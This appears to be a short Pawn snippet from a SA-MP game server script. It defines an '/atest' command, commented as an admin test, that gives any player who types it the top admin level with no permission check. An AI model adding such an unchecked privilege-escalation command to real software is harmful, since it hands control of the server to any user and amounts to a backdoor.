/*
*
*
*           COMMAND
*
*
*
*/

CMD:atest(playerid, params[]) //admin test 
{
    PlayerInfo[playerid][Admin] = 9;
    return 1;
}